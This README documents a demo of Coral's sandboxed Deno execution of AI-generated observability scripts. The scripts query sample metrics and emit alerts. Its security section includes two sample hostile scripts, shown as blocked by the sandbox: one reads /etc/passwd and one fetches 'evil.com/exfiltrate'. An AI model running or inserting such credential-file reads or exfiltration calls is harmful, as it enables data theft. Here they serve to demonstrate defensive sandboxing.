# Coral Script Execution Demo

This demo showcases the sandboxed TypeScript execution capability of Coral, demonstrating how AI-generated scripts can safely query observability data and emit alerts.

## What This Demo Shows

1. **Sandboxed Execution**: TypeScript scripts run in Deno with restricted permissions
2. **Live Data Access**: Scripts query DuckDB metrics, traces, and system data via HTTP API
3. **Custom Logic**: Scripts implement correlation analysis and alerting
4. **Event Emission**: Scripts emit alerts when conditions are met

## Architecture

```
┌─────────────────────────────────────┐
│ TypeScript Script (Deno)            │
│  - high-latency-alert.ts            │
│  - correlation-analysis.ts          │
│                                     │
│  Permissions:                       │
│    --allow-net=localhost:9003       │
└──────────────┬──────────────────────┘
               │ HTTP GET/POST
               │ (JSON)
               ▼
┌─────────────────────────────────────┐
│ SDK Server (Mock for Demo)          │
│  - Listens on localhost:9003        │
│  - Queries DuckDB                   │
│  - Returns JSON results             │
└──────────────┬──────────────────────┘
               │ SQL queries
               ▼
┌─────────────────────────────────────┐
│ DuckDB (agent.db)                   │
│  - otel_spans_local                 │
│  - system_metrics_local             │
│                                     │
│  Sample data:                       │
│    - Payments: 40% error rate       │
│    - Orders: 0% error rate          │
│    - Users: Slow but no errors      │
│    - CPU: 78% (high)                │
│    - Memory: 84% (high)             │
└─────────────────────────────────────┘
```

## Setup

### Prerequisites

- **Deno**: JavaScript/TypeScript runtime
  ```bash
  curl -fsSL https://deno.land/install.sh | sh
  ```

- **DuckDB CLI** (optional, for creating sample database):
  ```bash
  # macOS
  brew install duckdb

  # Linux
  wget https://github.com/duckdb/duckdb/releases/latest/download/duckdb_cli-linux-amd64.zip
  unzip duckdb_cli-linux-amd64.zip
  ```

### Quick Start

```bash
# Run the setup script
cd examples/scripts/demo
chmod +x setup-demo.sh
./setup-demo.sh
```

This will:
1. Check for Deno (install if missing)
2. Create demo directory structure
3. Generate sample DuckDB database
4. Create SDK server mock

## Running the Demo

### Terminal 1: Start SDK Server

```bash
cd coral-demo
DEMO_DIR=$(pwd) deno run --allow-net --allow-env sdk-server-mock.ts
```

You should see:
```
🚀 SDK Server Mock running on http://localhost:9003
```

### Terminal 2: Run Example Scripts

#### High Latency Alert

Monitors the payments service for high P99 latency and error rates:

```bash
cd examples/scripts
deno run --allow-net=localhost:9003 high-latency-alert.ts
```

Expected output:
```
Starting high latency monitoring for payments...
  Latency threshold: 500ms
  Error rate threshold: 1%
  Check interval: 30s
🚨 CRITICAL ALERT: payments degraded - P99=650.0ms, Errors=40.00%
```

#### Correlation Analysis

Analyzes correlation between errors and system resource usage:

```bash
cd examples/scripts
deno run --allow-net=localhost:9003 correlation-analysis.ts
```

Expected output:
```
Starting correlation analysis for payments...
  High memory threshold: 80%
  High CPU threshold: 80%
  Check interval: 60s
Found 2 error traces in the last 5 minutes
🔍 CORRELATION DETECTED: 2 errors + High CPU
   CPU: 78.9%, Memory: 84.4%
```

### Terminal 3: Watch SDK Server Logs

In the SDK server terminal, you'll see query logs:

```
[SDK Server] Get P99 for payments
[SDK Server] Get error rate for payments
[SDK Server] Event emitted: {
  name: "alert",
  data: {
    message: "payments service degraded: high latency AND high error rate",
    severity: "critical",
    ...
  }
}
```

## What's Happening

### 1. Script Initialization

The script imports the Coral SDK:
```typescript
import * as coral from "jsr:@coral/sdk";
```

### 2. Query Execution

Scripts query data via HTTP:
```typescript
const p99 = await coral.metrics.getPercentile("payments", "http.server.duration", 0.99);
// → HTTP GET localhost:9003/metrics/percentile?service=payments&p=0.99
```

### 3. Data Analysis

Scripts analyze results in TypeScript:
```typescript
if (p99 > 500_000_000 && errorRate > 0.01) {
  // Condition met: high latency AND high error rate
}
```

### 4. Event Emission

Scripts emit alerts:
```typescript
await coral.emit("alert", {
  severity: "critical",
  message: "Payments service degraded",
  p99_ms: 650,
  error_rate_pct: 40
}, "critical");
// → HTTP POST localhost:9003/emit
```

### 5. Colony Aggregation (Not Shown in Demo)

In production:
- SDK server forwards events to colony via gRPC
- Colony aggregates events from all agents
- AI analyzes patterns and suggests root causes

## Security Demonstration

### Sandboxing in Action

Try running a script that attempts to access the filesystem:

```typescript
// bad-script.ts
const data = await Deno.readFile("/etc/passwd");
console.log(data);
```

```bash
deno run --allow-net=localhost:9003 bad-script.ts
```

**Result:** ❌ Permission denied (filesystem access not granted)

Try accessing an external network:

```typescript
// bad-script-2.ts
const response = await fetch("https://evil.com/exfiltrate");
```

```bash
deno run --allow-net=localhost:9003 bad-script-2.ts
```

**Result:** ❌ Permission denied (only localhost:9003 allowed)

### Only Local HTTP Access

Scripts can ONLY:
- ✅ Call localhost:9003 (SDK server)
- ❌ Access filesystem
- ❌ Access external network
- ❌ Execute commands
- ❌ Access environment variables

## Sample Data Analysis

The demo database contains:

### Payments Service (Unhealthy)
- **P99 Latency**: 650ms (threshold: 500ms) ⚠️
- **Error Rate**: 40% (2 errors / 5 requests) 🚨
- **Status**: CRITICAL

### Orders Service (Healthy)
- **P99 Latency**: 30ms ✅
- **Error Rate**: 0% ✅
- **Status**: OK

### Users Service (Slow)
- **P99 Latency**: 580ms ⚠️
- **Error Rate**: 0% ✅
- **Status**: WARNING

### System Metrics
- **CPU**: 78.9% (threshold: 80%) ⚠️
- **Memory**: 84.4% (14GB / 16GB) 🚨

### Correlation Findings

The script detects:
- ✅ **High errors in payments** (40%)
- ✅ **High CPU usage** (78.9%)
- ✅ **High memory usage** (84.4%)
- 🔍 **Correlation**: Errors + Resource Exhaustion

**Conclusion**: Payments service degradation likely due to resource exhaustion.

## Customizing the Demo

### Modify Sample Data

Edit `setup-db.sql` to change:
- Span latencies (duration_ns)
- Error rates (is_error, http_status)
- System metrics (cpu, memory)

Recreate database:
```bash
cd coral-demo
duckdb duckdb/agent.db < setup-db.sql
```

### Create Your Own Script

```typescript
// my-custom-script.ts
import * as coral from "jsr:@coral/sdk";

const spans = await coral.db.query(`
  SELECT service_name, COUNT(*) as count
  FROM otel_spans_local
  GROUP BY service_name
`);

console.log("Services:", spans);
```

Run it:
```bash
deno run --allow-net=localhost:9003 my-custom-script.ts
```

## Limitations (Demo vs Production)

This demo uses a **mock SDK server** for simplicity. In production:

| Feature | Demo | Production |
|---------|------|------------|
| SDK Server | TypeScript mock | Go HTTP server |
| Database | Pre-populated | Live data from agent |
| Connection Pool | Single connection | 20 concurrent connections |
| Query Timeouts | No timeout | 30s timeout |
| Row Limits | Unlimited | 10,000 rows max |
| Monitoring | Console logs | Structured logging + metrics |
| Security | Deno permissions | Deno + read-only DuckDB |

## Next Steps

1. **Explore RFD 076**: Read the full design document
   ```
   cat ../../RFDs/076-sandboxed-typescript-execution.md
   ```

2. **Review Implementation**: Check the Go implementation
   ```
   ls -la ../../internal/agent/script/
   ```

3. **Try Real Integration**: Set up Coral agent with real DuckDB

4. **Write Your Own Scripts**: Create custom observability logic

## Troubleshooting

### "Deno not found"
```bash
curl -fsSL https://deno.land/install.sh | sh
export PATH="$HOME/.deno/bin:$PATH"
```

### "Connection refused to localhost:9003"
Make sure the SDK server is running:
```bash
ps aux | grep sdk-server-mock
```

### "Permission denied"
Deno's sandbox is working! Check that you have the correct permissions:
```bash
deno run --allow-net=localhost:9003 script.ts
```

### Scripts not detecting issues
Check that the SDK server is returning mock data correctly:
```bash
curl http://localhost:9003/health
curl "http://localhost:9003/metrics/percentile?service=payments&p=0.99"
```

## Learn More

- [RFD 076: Sandboxed TypeScript Execution](../../RFDs/076-sandboxed-typescript-execution.md)
- [Script Architecture Comparison](../../internal/agent/script/ARCHITECTURE_COMPARISON.md)
- [Concurrency Model](../../internal/agent/script/CONCURRENCY.md)
- [Coral TypeScript SDK](../../pkg/sdk/typescript/README.md)

## Feedback

Found an issue or have suggestions? Open an issue on GitHub!
